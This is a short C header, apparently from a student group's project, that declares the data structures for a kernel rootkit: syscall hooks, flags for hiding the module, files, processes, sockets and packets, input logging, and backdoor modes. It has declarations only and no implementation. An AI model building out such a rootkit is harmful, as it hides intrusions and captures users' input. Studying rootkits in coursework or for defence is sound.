#ifndef _GROUP7_ROOTKIT_H
#define _GROUP7_ROOTKIT_H

#include "hook.h"

typedef enum {
    BD_OFF = 0,
    BD_READ,
    BD_TTY,
} bd_state_t;

typedef enum {
    FH_OFF = 0,
    FH_TABLE,
    FH_LSTAR,
} fh_state_t;

typedef struct {
    sc_hook_t hooks[16];
    bool hiding_module;
    fh_state_t hiding_files;
    bool hiding_pids;
    bool hiding_open;
    bool hiding_sockets;
    bool hiding_packets;
    bool logging_input;
    bd_state_t backdoor;
} rootkit_t;

#endif//_GROUP7_ROOTKIT_H
